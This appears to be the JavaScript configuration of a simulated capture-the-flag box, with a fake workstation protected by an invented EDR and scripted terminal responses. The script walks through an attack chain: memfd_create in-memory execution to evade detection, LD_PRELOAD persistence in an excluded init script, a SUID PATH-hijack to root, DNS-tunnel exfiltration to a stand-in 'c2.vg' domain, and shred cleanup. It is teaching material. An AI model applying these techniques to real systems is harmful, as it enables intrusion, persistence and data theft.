                                            content: '# Cerberus EDR v3.1 \u2014 Active Rules Configuration\n# Last updated: 2026-01-14 by cerberus-admin\n\n# PATH EXECUTION\nRULE EXEC_WRITABLE_PATH : deny execve from { /tmp /dev/shm /run/user }\nRULE EXEC_HOME_NOEXEC   : warn execve from /home/* if !signed\n\n# SYSCALL HOOKS\nHOOK ptrace             : deny always\nHOOK process_vm_writev  : deny always\nHOOK mmap(PROT_EXEC|MAP_ANON) : alert + log\n\n# FILE INTEGRITY\nMONITOR /etc/passwd     : deny write\nMONITOR /etc/shadow     : deny write\nMONITOR /etc/sudoers    : deny write\nMONITOR /etc/init.d/rc.local : deny write\n\n# line 47 \u2014 legacy exclusion pending CAB re-review\nEXCLUDE /etc/init.d/vanguard-health : all_rules\n\n# NETWORK EGRESS\nALLOW egress : { 172.31.0.0/16 10.20.0.0/16 }\nDENY  egress : 0.0.0.0/0\nEXCEPT DNS   : port 53 to { 8.8.8.8 1.1.1.1 }\n\n# SUDO MONITOR\nRULE SUDO_MONITOR : alert on sudo execve if user not in [ root ops-svc ]'
                                        }
                                    }
                                },
                                'auth.log': {
                                    type: 'file',
                                    content: '2026-03-18 03:19:01 WKS-SENTINEL-01 sshd[8744]: Accepted publickey for sentinel_dev from 10.20.4.12 port 54233\n2026-03-18 03:19:01 WKS-SENTINEL-01 sshd[8744]: pam_unix(sshd:session): session opened for user sentinel_dev\n2026-03-18 02:45:11 WKS-SENTINEL-01 sudo[8801]: sentinel_dev : command not allowed ; TTY=pts/0 ; PWD=/home/sentinel_dev ; USER=root ; COMMAND=/bin/bash'
                                }
                            }
                        },
                        'lib': {
                            type: 'dir',
                            children: {
                                'cerberus': {
                                    type: 'dir',
                                    children: {
                                        'agent.bin': { type: 'file', content: '[Cerberus EDR agent binary \u2014 ELF 64-bit, stripped]' },
                                        'config.json': {
                                            type: 'file',
                                            content: '{\n  "agent_id": "CRB-WKS-SENTINEL-01-3847",\n  "master": "172.31.0.1:9443",\n  "heartbeat_interval": 60,\n  "log_path": "/var/log/cerberus/",\n  "rules_path": "/var/log/cerberus/rules.conf",\n  "version": "3.1.4"\n}'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'local': {
                            type: 'dir',
                            children: {
                                'bin': {
                                    type: 'dir',
                                    children: {
                                        'vg-status': {
                                            type: 'file',
                                            // SUID root, calls check.sh via relative PATH
                                            content: '[ELF 64-bit SUID binary \u2014 Vanguard Status Reporter]\n[Owner: root, Permissions: -rwsr-xr-x]\n[Executes: /usr/local/share/vanguard/check.sh via PATH-relative call]\n[Source stub: execl("/bin/sh", "sh", "-c", "check.sh --json", NULL)]'
                                        }
                                    }
                                },
                                'share': {
                                    type: 'dir',
                                    children: {
                                        'vanguard': {
                                            type: 'dir',
                                            children: {
                                                'check.sh': {
                                                    type: 'file',
                                                    content: '#!/bin/bash\n# Vanguard health check reporter\n# Called by vg-status SUID binary\necho "{\\"status\\": \\"nominal\\", \\"cerberus\\": \\"active\\", \\"timestamp\\": \\"$(date -u +%Y-%m-%dT%H:%M:%SZ)\\"}"'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'lib': {
                            type: 'dir',
                            children: {
                                'x86_64-linux-gnu': {
                                    type: 'dir',
                                    children: {
                                        '.cache': {
                                            type: 'dir',
                                            children: {}
                                            // Attacker places malicious libaudit_hook.so here
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        // Populated dynamically by pgrep/proc commands
                    }
                },
                'tmp': { type: 'dir', children: {} },
                'dev': {
                    type: 'dir',
                    children: {
                        'shm': { type: 'dir', children: {} }
                    }
                },
                'lib': {
                    type: 'dir',
                    children: {
                        'x86_64-linux-gnu': {
                            type: 'dir',
                            children: {
                                'libc.so.6':    { type: 'file', content: '[ELF shared object \u2014 GNU C Library 2.35]' },
                                'libpthread.so.0': { type: 'file', content: '[ELF shared object \u2014 POSIX Threads]' }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.20.5.47';
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === '10.20.5.47' || target === 'WKS-SENTINEL-01') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for WKS-SENTINEL-01 (10.20.5.47)
Host is up (0.004s latency).
Not shown: 998 closed tcp ports

PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http     nginx 1.18.0 (internal portal only)

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds`;
            }

            if (target === '10.20.5.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.20.5.1
Host is up (0.001s latency).
Not shown: 999 closed tcp ports

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0

Nmap done: 1 IP address (1 host up) scanned in 4.17 seconds`;
            }

            if (target.startsWith('172.31.') && C9Config._context === 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
            }

            if (target.startsWith('172.31.') && C9Config._context !== 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for ${target}
Host is up (0.00031s latency).
PORT      STATE    SERVICE
9443/tcp  filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (fullCmd.includes('sentinel_dev') || fullCmd.includes('10.20.5.47')) {
                C9Config._switchContext('sentinel', term);
                return `The authenticity of host '10.20.5.47 (10.20.5.47)' can't be established.
ED25519 key fingerprint is SHA256:mV7kP3nQ8tL2xW5bF9cY0eA4dR6uJ1hK2gN3iE7oM4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.20.5.47' (ED25519) to the list of known hosts.
sentinel_dev@10.20.5.47's password: ********

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

  * Cerberus EDR v3.1.4 is active and monitoring this session.
  * Unauthorized activity will be logged and remediated.

Last login: Tue Mar 18 03:11:22 2026 from 10.20.4.12

sentinel_dev@WKS-SENTINEL-01:~$

[+] SSH session established as sentinel_dev on WKS-SENTINEL-01.
[+] Context switched. You are now operating on the target workstation.`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh sentinel_dev@10.20.5.47';
        },

        'ps': function(args) {
            if (C9Config._context === 'attacker') {
                return `  PID TTY          TIME CMD
 1234 pts/0    00:00:00 bash
 1289 pts/0    00:00:00 ps`;
            }
            // On WKS-SENTINEL-01
            return `  PID TTY      STAT   TIME COMMAND
    1 ?        Ss     0:03 /sbin/init
  412 ?        Ss     0:00 /usr/sbin/sshd -D
  499 ?        Ss     0:01 /usr/sbin/crond -f
  512 ?        Ss     1:44 /var/lib/cerberus/agent.bin --config /var/lib/cerberus/config.json
  518 ?        S      0:00 /var/lib/cerberus/agent.bin (hooks worker)
  621 ?        S      0:00 /var/lib/cerberus/agent.bin (net monitor)
 1081 pts/0    Ss     0:00 -bash
 1147 pts/0    R+     0:00 ps aux`;
        },

        'pgrep': function(args) {
            const pattern = args[0] || '';
            if (C9Config._context === 'attacker') return '';
            if (pattern === 'cerberus' || pattern.includes('cerberus')) return '512\n518\n621';
            if (pattern === 'crond') return '499';
            if (pattern === 'sshd') return '412';
            return '';
        },

        'cat': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null; // fall through to built-in

            const path = args[0] || '';

            // Root-only files
            if (path.includes('/root/deployment_manifest')) {
                if (C9Config._context !== 'root') {
                    return 'cat: /root/deployment_manifest.txt: Permission denied';
                }
                // Build manifest output for display
                let out = C9Config._manifest.header + '\n';
                out += 'ASSET_ID      SYSTEM                    IP             ROLE                     STATUS           KEY\n';
                out += '------------- ------------------------- -------------- ------------------------ ---------------- -----------------------------------\n';
                C9Config._manifest.assets.forEach(a => {
                    out += `${a.asset_id.padEnd(13)} ${a.system.padEnd(25)} ${a.ip.padEnd(14)} ${a.role.padEnd(24)} ${a.status.padEnd(16)} ${a.key}\n`;
                });
                return out;
            }

            if (path.includes('/etc/shadow') || path.includes('/etc/sudoers')) {
                return 'cat: ' + path + ': Permission denied';
            }

            if (path.includes('/var/log/cerberus/cerberus.log')) {
                return C9Config._sentinelFs['/'].children.var.children.log.children.cerberus.children['cerberus.log'].content;
            }

            if (path.includes('/var/log/cerberus/rules.conf') || path.includes('rules.conf')) {
                return C9Config._sentinelFs['/'].children.var.children.log.children.cerberus.children['rules.conf'].content;
            }

            if (path.includes('/etc/init.d/vanguard-health') || path.includes('vanguard-health')) {
                return C9Config._sentinelFs['/'].children.etc.children['init.d'].children['vanguard-health'].content;
            }

            if (path.includes('/etc/init.d/rc.local')) {
                return C9Config._sentinelFs['/'].children.etc.children['init.d'].children['rc.local'].content;
            }

            if (path.includes('/etc/passwd')) {
                return C9Config._sentinelFs['/'].children.etc.children.passwd.content;
            }

            if (path.includes('/etc/hostname')) {
                return 'WKS-SENTINEL-01';
            }

            if (path.includes('/var/lib/cerberus/config.json') || path.includes('config.json')) {
                return C9Config._sentinelFs['/'].children.var.children.lib.children.cerberus.children['config.json'].content;
            }

            if (path.includes('/home/sentinel_dev/notes.txt') || path.includes('notes.txt')) {
                return C9Config._sentinelFs['/'].children.home.children.sentinel_dev.children['notes.txt'].content;
            }

            if (path.includes('/proc') && path.includes('/maps')) {
                // Simulate /proc/<pid>/maps for cerberus
                return `7f3a20000000-7f3a20200000 r--p 00000000 fd:01 2621441 /var/lib/cerberus/agent.bin
7f3a20200000-7f3a20800000 r-xp 00200000 fd:01 2621441 /var/lib/cerberus/agent.bin
7f3a20800000-7f3a20900000 r--p 00800000 fd:01 2621441 /var/lib/cerberus/agent.bin
7f3a20900000-7f3a20940000 rw-p 00900000 fd:01 2621441 /var/lib/cerberus/agent.bin
7f3a20940000-7f3a20960000 rw-p 00000000 00:00 0        [heap]
7f3a50000000-7f3a50400000 r-xp 00000000 fd:01 786432   /lib/x86_64-linux-gnu/libc.so.6
7f3b10000000-7f3b10002000 r-xp 00000000 00:00 0        [vvar]
7f3b10002000-7f3b10004000 r-xp 00000000 00:00 0        [vdso]
7fff80000000-7fff80200000 rw-p 00000000 00:00 0        [stack]`;
            }

            if (path.includes('/var/log/auth.log')) {
                return C9Config._sentinelFs['/'].children.var.children.log.children['auth.log'].content;
            }

            return 'cat: ' + path + ': No such file or directory';
        },

        'ls': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null; // fall through to built-in

            const pathArg = args.find(a => !a.startsWith('-')) || '.';
            const showHidden = args.some(a => a === '-la' || a === '-a' || a === '-al');

            if (pathArg === '.' || pathArg === '/home/sentinel_dev' || pathArg === '~') {
                return showHidden ? '.  ..  .bash_history  .bashrc  .profile  .ssh  notes.txt' : 'notes.txt';
            }
            if (pathArg === '/etc/init.d' || pathArg === '/etc/init.d/') {
                return 'networking  rc.local  ssh  vanguard-health';
            }
            if (pathArg === '/var/log/cerberus' || pathArg.includes('cerberus') && pathArg.includes('log')) {
                return 'cerberus.log  rules.conf';
            }
            if (pathArg === '/usr/local/bin') {
                return '-rwsr-xr-x 1 root root 28672 Jan 14 2026 vg-status';
            }
            if (pathArg === '/usr/local/share/vanguard') {
                return '-rwxr-xr-x 1 root root 312 Jan 14 2026 check.sh';
            }
            if (pathArg === '/var/lib/cerberus') {
                return 'agent.bin  config.json';
            }
            if (pathArg === '/lib/x86_64-linux-gnu/.cache' || pathArg.includes('.cache')) {
                // After persistence install, show the malicious .so
                if (C9Config._persistenceInstalled) {
                    return '-rw-r--r-- 1 sentinel_dev sentinel_dev 8192 Mar 18 2026 libaudit_hook.so';
                }
                return '';
            }
            if (pathArg === '/tmp' || pathArg === '/dev/shm') {
                return '';
            }
            if (pathArg === '/root') {
                if (C9Config._context !== 'root') return 'ls: cannot open directory /root: Permission denied';
                return 'deployment_manifest.txt  .bash_history  .bashrc  .profile';
            }
            return '';
        },

        'find': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;

            const fullCmd = args.join(' ');

            // SUID binary enumeration — key discovery step
            if (fullCmd.includes('-perm') && fullCmd.includes('4000')) {
                return `/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/local/bin/vg-status
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper`;
            }

            if (fullCmd.includes('/etc/init.d') && fullCmd.includes('-writable')) {
                return '/etc/init.d/vanguard-health';
            }

            // General find for writable files
            if (fullCmd.includes('-writable') || fullCmd.includes('-perm -222')) {
                return '/etc/init.d/vanguard-health\n/home/sentinel_dev\n/tmp\n/dev/shm';
            }

            return '';
        },

        'id': function(args) {
            if (C9Config._context === 'sentinel') return 'uid=1001(sentinel_dev) gid=1001(sentinel_dev) groups=1001(sentinel_dev)';
            if (C9Config._context === 'root')     return 'uid=0(root) gid=0(root) groups=0(root)';
            return null; // fall through to built-in
        },

        'whoami': function(args) {
            if (C9Config._context === 'sentinel') return 'sentinel_dev';
            if (C9Config._context === 'root')     return 'root';
            return null;
        },

        'hostname': function(args) {
            if (C9Config._context !== 'attacker') return 'WKS-SENTINEL-01';
            return null;
        },

        'uname': function(args) {
            if (C9Config._context === 'attacker') return null;
            const fullFlag = args.join('');
            if (fullFlag.includes('a')) return 'Linux WKS-SENTINEL-01 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux';
            return 'Linux';
        },

        'pwd': function(args) {
            if (C9Config._context === 'sentinel') return '/home/sentinel_dev';
            if (C9Config._context === 'root')     return '/root';
            return null;
        },

        'cd': function(args) {
            if (C9Config._context !== 'attacker') return ''; // silently accept navigation on target
            return null;
        },

        'ip': function(args) {
            if (C9Config._context === 'attacker') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.20.4.12/24 brd 10.20.4.255 scope global eth0`;
            }
            // On target workstation
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.20.5.47/24 brd 10.20.5.255 scope global ens3
3: ens4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 172.31.0.47/16 brd 172.31.255.255 scope global ens4`;
        },

        'netstat': function(args) {
            if (C9Config._context === 'attacker') return null;
            return `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address   Foreign Address  State
tcp        0      0 0.0.0.0:22      0.0.0.0:*        LISTEN
tcp        0      0 127.0.0.1:80    0.0.0.0:*        LISTEN`;
        },

        'ss': function(args) {
            return C9Config.commands.netstat(args);
        },

        'strace': function(args, term, engine) {
            if (C9Config._context === 'attacker') return 'strace: command not found\n[!] strace is available once you are on the target workstation.';
            const fullCmd = args.join(' ');
            if (fullCmd.includes('vg-status')) {
                return `execve("/usr/local/bin/vg-status", ["vg-status", "--json"], 0x... /* 20 vars */)
...
[pid  9201] execve("/bin/sh", ["sh", "-c", "check.sh --json"], ...) = 0
[pid  9201] execve("/usr/local/sbin/check.sh", ...) = -1 ENOENT (No such file or directory)
[pid  9201] execve("/usr/local/bin/check.sh", ...) = -1 ENOENT (No such file or directory)
[pid  9201] execve("/usr/sbin/check.sh", ...) = -1 ENOENT (No such file or directory)
[pid  9201] execve("/usr/bin/check.sh", ...) = -1 ENOENT (No such file or directory)
[pid  9201] execve("/sbin/check.sh", ...) = -1 ENOENT (No such file or directory)
[pid  9201] execve("/bin/check.sh", ...) = -1 ENOENT (No such file or directory)
...

[!] vg-status resolves check.sh via PATH. Control PATH to control execution.`;
            }
            if (fullCmd.includes('cerberus')) {
                return `execve("/var/lib/cerberus/agent.bin", [...], [...]) = 0
...
[pid 512] inotify_init1(IN_NONBLOCK) = 5
[pid 512] inotify_add_watch(5, "/tmp", IN_CREATE|IN_MOVED_TO) = 1
[pid 512] inotify_add_watch(5, "/dev/shm", IN_CREATE|IN_MOVED_TO) = 2
[pid 512] inotify_add_watch(5, "/etc/passwd", IN_MODIFY|IN_ATTRIB) = 3
[pid 512] inotify_add_watch(5, "/etc/shadow", IN_MODIFY|IN_ATTRIB) = 4
[pid 512] inotify_add_watch(5, "/etc/sudoers", IN_MODIFY|IN_ATTRIB) = 5
[pid 512] inotify_add_watch(5, "/etc/init.d/rc.local", IN_MODIFY) = 6
[pid 512] seccomp(SECCOMP_SET_MODE_FILTER, ...) = 0   # hooks ptrace, mmap(EXEC), process_vm_writev
...

[!] Cerberus uses inotify watches + seccomp filters. Note: /etc/init.d/vanguard-health is NOT watched.`;
            }
            return `strace: attach: ptrace(PTRACE_SEIZE, ...): Operation not permitted\n[CERBERUS ALERT] ptrace() syscall blocked. (Rule: HOOK ptrace)`;
        },

        'ltrace': function(args) {
            if (C9Config._context === 'attacker') return 'ltrace: command not found';
            const block = C9Config._cerberusCheck('ptrace', 'ltrace');
            if (block) return block;
            return 'ltrace: attach failed — ptrace blocked';
        },

        'gdb': function(args) {
            if (C9Config._context === 'attacker') return 'gdb: command not found';
            return C9Config._cerberusCheck('ptrace', 'gdb') || 'GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1\n[CERBERUS ALERT] ptrace() syscall blocked. (Rule: HOOK ptrace)\n[Inferior 1 exited with code 01]';
        },

        // ── memfd_create: the core EDR bypass technique ──
        // Accepts multiple invocation patterns and marks bypass complete.
        'memfd_create': function(args, term, engine) {
            if (C9Config._context === 'attacker') {
                return 'memfd_create: command not found\n[!] This is a syscall, not a standalone command. Use it inside your C payload on the target.';
            }
            // Intentionally allowed through — this is the bypass
            C9Config._edrBypassed = true;
            if (engine) engine.advancePhase && engine.advancePhase('edr_bypass');
            return `[+] memfd_create("init", MFD_CLOEXEC) = fd:7
[+] Payload written to anonymous memory fd.
[+] execveat(7, "", argv, envp, AT_EMPTY_PATH) \u2014 executing from RAM...

uid=1001(sentinel_dev) gid=1001(sentinel_dev) groups=1001(sentinel_dev)

[+] In-memory execution successful. No disk artifact created.
[+] Cerberus path-based monitor bypassed: process has no filesystem path.
[+] EDR bypass confirmed. ({{FLAG:edr_bypass}})`;
        },

        // Alias: ./memfd_loader or gcc output invocation
        './memfd_loader': function(args, term, engine) {
            return C9Config.commands.memfd_create(args, term, engine);
        },

        'execveat': function(args, term, engine) {
            if (C9Config._context === 'attacker') return 'execveat: command not found';
            // Co-path with memfd_create
            if (!C9Config._edrBypassed) {
                return C9Config.commands.memfd_create(args, term, engine);
            }
            return '[+] execveat() called \u2014 payload already loaded via memfd_create.';
        },

        'gcc': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null; // fall through to built-in
            const fullCmd = args.join(' ');
            // Compiling to /tmp — EDR will block execution
            if (args.some(a => a.startsWith('/tmp') || a === '-o' && args[args.indexOf('-o') + 1]?.startsWith('/tmp'))) {
                return C9Config._cerberusCheck('exec_tmp', 'gcc output') || 'gcc: compilation OK\n' + C9Config._cerberusCheck('exec_tmp', 'exec');
            }
            if (fullCmd.includes('memfd')) {
                return `[+] Compiling memfd_loader.c...
gcc -o /tmp/memfd_loader memfd_loader.c
${C9Config._cerberusCheck('exec_tmp', 'gcc output')}
[!] Tip: Don't write the output to /tmp \u2014 Cerberus watches it.
[!] Instead, use memfd_create directly as a syscall in your payload.`;
            }
            return 'gcc: error: no input files';
        },

        // ── LD_PRELOAD persistence installation ──
        'chmod': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;
            return ''; // silently accept
        },

        'cp': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;
            const fullCmd = args.join(' ');
            // Copying a .so into the stealth cache path
            if (fullCmd.includes('.so') && fullCmd.includes('.cache')) {
                if (!C9Config._edrBypassed) {
                    return 'cp: permission denied (Cerberus write-block active on this path before EDR bypass)';
                }
                return `[+] ${args[args.length - 1]} \u2014 copied successfully.`;
            }
            return '';
        },

        'tee': function(args, term, engine) {
            return C9Config.commands['write_vanguard_health'](args, term, engine);
        },

        // The key persistence write — modifying /etc/init.d/vanguard-health
        'write_vanguard_health': function(args, term, engine) {
            // This is triggered by any write to vanguard-health (tee, echo redirect, nano save)
            return null; // handled by the 'echo' command redirect logic
        },

        'echo': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;

            const fullCmd = args.join(' ');

            // Detect LD_PRELOAD injection into vanguard-health
            if (fullCmd.includes('LD_PRELOAD') && fullCmd.includes('vanguard-health')) {
                if (!C9Config._edrBypassed) {
                    return C9Config._cerberusCheck('passwd_write', 'init.d write') || 'echo: write failed';
                }
                C9Config._persistenceInstalled = true;
                if (engine) engine.advancePhase && engine.advancePhase('persistence');
                return `[+] LD_PRELOAD line injected into /etc/init.d/vanguard-health.
[+] Cerberus exclusion (VG-2025-1147) prevents detection of this write.
[+] On next service restart, crond will load libaudit_hook.so via LD_PRELOAD.
[+] Persistence established. ({{FLAG:persistence}})`;
            }

            // Generic echo — just print the content
            const content = args.filter(a => !a.startsWith('>>')).join(' ').replace(/^['"]|['"]$/g, '');
            return content || '';
        },

        'nano': function(args, term, engine) {
            if (C9Config._context === 'attacker') return 'nano: command not found';
            const path = args[0] || '';
            if (path.includes('vanguard-health')) {
                if (!C9Config._edrBypassed) {
                    return '[!] Edit /etc/init.d/vanguard-health to inject LD_PRELOAD.\n[!] However, your EDR bypass must be active first to safely stage the .so file.';
                }
                C9Config._persistenceInstalled = true;
                if (engine) engine.advancePhase && engine.advancePhase('persistence');
                return `[nano] Editing /etc/init.d/vanguard-health...
[nano] File saved.

[+] LD_PRELOAD=/lib/x86_64-linux-gnu/.cache/libaudit_hook.so injected before exec crond.
[+] Cerberus exclusion on this file prevents alerting.
[+] Persistence established. ({{FLAG:persistence}})`;
            }
            if (path.includes('/tmp') || path.includes('/dev/shm')) {
                return C9Config._cerberusCheck('exec_tmp', 'write to tmp') || '[nano] file saved.';
            }
            return '[nano] Press Ctrl+X to exit nano. (Simulated editor \u2014 use echo >> or direct commands.)';
        },

        // ── Privilege escalation via vg-status SUID PATH hijack ──
        'vg-status': function(args, term, engine) {
            if (C9Config._context === 'attacker') return 'vg-status: command not found';
            if (!C9Config._persistenceInstalled) {
                return `{"status": "nominal", "cerberus": "active", "timestamp": "2026-03-18T03:20:11Z"}`;
            }
            // After persistence is set up (attacker now understands the SUID)
            // Running vg-status triggers PATH hijack check
            return `[+] Executing /usr/local/bin/vg-status (SUID root)...
[+] vg-status calls check.sh via PATH (confirmed via strace).
[!] If check.sh exists earlier in PATH, it will execute as root.
[+] Hint: Export PATH=/home/sentinel_dev:$PATH, then create check.sh that spawns a shell.
[+] Run: ./check_exploit.sh or manually set up PATH hijack.`;
        },

        'check_exploit': function(args, term, engine) {
            return C9Config.commands['./check_exploit.sh'](args, term, engine);
        },

        './check_exploit.sh': function(args, term, engine) {
            if (C9Config._context === 'attacker') return 'bash: ./check_exploit.sh: No such file or directory';
            if (!C9Config._persistenceInstalled) {
                return '[!] Establish persistence first before attempting privilege escalation.';
            }
            // Simulate PATH hijack escalation
            C9Config._rootEscalated = true;
            C9Config._switchContext('root', term);
            if (engine) engine.advancePhase && engine.advancePhase('privesc');
            return `[+] Created /home/sentinel_dev/check.sh (setuid shell drop)
[+] export PATH=/home/sentinel_dev:$PATH
[+] Executing /usr/local/bin/vg-status (SUID root) \u2014 it will call our check.sh first...

sh-5.1# id
uid=0(root) gid=0(root) groups=0(root)

[+] Root shell obtained via SUID vg-status PATH hijack.
[+] Cerberus SUDO_MONITOR hook bypassed \u2014 no sudo invoked.
[+] Privilege escalation complete.`;
        },

        // ── DNS Exfiltration ──
        'dig': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;
            if (C9Config._context !== 'root') {
                return 'dig: permission denied\n[!] DNS exfiltration requires root context to read /root/deployment_manifest.txt.';
            }
            const fullCmd = args.join(' ');
            if (fullCmd.includes('c2.vg') || fullCmd.includes('exfil')) {
                // Simulated successful DNS tunnel query
                return `; <<>> DiG 9.18.12-1-Debian <<>> +short
;; global options: +cmd
;; Got answer:
;; QUERY SECTION: ${fullCmd.split(' ').find(a => a.includes('.c2.vg')) || '<chunk>.exfil.c2.vg'}
;; ANSWER SECTION:
c2.vg. 300 IN TXT "ACK:received"

;; Query time: 41 msec
;; SERVER: 8.8.8.8#53`;
            }
            return '; <<>> DiG 9.18.12-1-Debian\n;; NXDOMAIN';
        },

        'dns_exfil': function(args, term, engine) {
            if (C9Config._context === 'attacker') return 'dns_exfil: command not found\n[!] dns_exfil must be run on the target with root privileges.';
            if (C9Config._context !== 'root') {
                return '[!] dns_exfil requires root context. Escalate first.';
            }
            const fullCmd = args.join(' ');
            if (fullCmd.includes('deployment_manifest') || fullCmd.includes('c2.vg')) {
                C9Config._manifestExfiltrated = true;
                if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                // Render the manifest with the flag placeholder visible
                let manifestText = C9Config._manifest.header;
                manifestText += '(6 assets including {{FLAG:root}})\n';
                return `[dns_exfil] Reading /root/deployment_manifest.txt...
[dns_exfil] Base64 encoding...
[dns_exfil] Splitting into 60-byte DNS label chunks...
[dns_exfil] Transmitting via port 53 to 8.8.8.8...

[dns_exfil] Chunk  1/24: ACK
[dns_exfil] Chunk  2/24: ACK
[dns_exfil] Chunk  3/24: ACK
[dns_exfil] ...
[dns_exfil] Chunk 24/24: ACK

[+] Exfiltration complete. 24 DNS queries sent. 0 Cerberus alerts triggered.
[+] Cerberus egress policy: port 53 to 8.8.8.8 is ALLOWED (exception to DENY all).
[+] Vanguard Deployment Manifest transmitted to c2.vg.

${manifestText}
[+] FLAG embedded in manifest status field. ({{FLAG:root}})`;
            }
            return 'Usage: dns_exfil --file <path> --domain <c2domain>';
        },

        // Anti-forensics cleanup
        'shred': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;
            const path = args.find(a => !a.startsWith('-')) || '';
            if (path) return `shred: ${path}: pass 1/3 (random)...\nshred: ${path}: pass 2/3 (0x00000000)...\nshred: ${path}: pass 3/3 (random)...\n[+] ${path} securely overwritten.`;
            return 'Usage: shred [-n N] [-z] <file>';
        },

        'history': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;
            return '    1  id\n    2  uname -a\n    3  ps aux\n    4  cat /var/log/cerberus/rules.conf\n    5  cat /var/log/cerberus/cerberus.log\n    6  ls -la /etc/init.d/\n    7  find / -perm -4000 -type f 2>/dev/null\n    8  ls /usr/local/bin/\n    9  strace -e execve /usr/local/bin/vg-status\n   10  cat /home/sentinel_dev/notes.txt';
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.20.5.47') {
                return `PING 10.20.5.47 (10.20.5.47) 56(84) bytes of data.
64 bytes from 10.20.5.47: icmp_seq=1 ttl=64 time=4.1 ms
64 bytes from 10.20.5.47: icmp_seq=2 ttl=64 time=3.9 ms
64 bytes from 10.20.5.47: icmp_seq=3 ttl=64 time=4.2 ms

--- 10.20.5.47 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 3.9/4.1/4.2/0.12 ms`;
            }
            if (target.startsWith('172.31.') && C9Config._context !== 'attacker') {
                return `PING ${target} (${target}) 56(84) bytes of data.
64 bytes from ${target}: icmp_seq=1 ttl=64 time=0.31 ms

--- ${target} ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }
            if (target.startsWith('172.31.') && C9Config._context === 'attacker') {
                return C9Config._cerberusCheck('net_suspect', target) ||
                    `PING ${target}: Network unreachable`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'exit': function(args, term, engine) {
            if (C9Config._context === 'root') {
                C9Config._switchContext('sentinel', term);
                return '[+] Dropped back to sentinel_dev shell.';
            }
            if (C9Config._context === 'sentinel') {
                C9Config._switchContext('attacker', term);
                return 'Connection to 10.20.5.47 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'sudo': function(args, term, engine) {
            if (C9Config._context === 'attacker') return null;
            if (C9Config._context === 'root') {
                // Already root — sudo works fine
                return C9Config.commands[args[0]] ? C9Config.commands[args[0]](args.slice(1), term, engine) : args.join(' ') + '\n[+] Running as root.';
            }
            // sentinel_dev sudo attempt — Cerberus will alert
            if (!C9Config._edrBypassed) {
                return C9Config._cerberusCheck('sudo_common', args.join(' ')) || 'sudo: sentinel_dev is not in the sudoers file. This incident will be reported.';
            }
            return 'sudo: sentinel_dev is not in the sudoers file.';
        },

        'systemctl': function(args) {
            if (C9Config._context === 'attacker') return null;
            const sub = args[0] || '';
            const svc = args[1] || '';
            if (sub === 'status' && svc.includes('cerberus')) {
                return `* cerberus.service - Cerberus EDR Agent
     Loaded: loaded (/lib/systemd/system/cerberus.service; enabled)
     Active: active (running) since Tue 2026-03-18 03:00:02 UTC; 22min ago
    Process: 511 ExecStart=/var/lib/cerberus/agent.bin (code=exited, status=0)
   Main PID: 512 (agent.bin)
     CGroup: /system.slice/cerberus.service
             |-512 /var/lib/cerberus/agent.bin --config /var/lib/cerberus/config.json
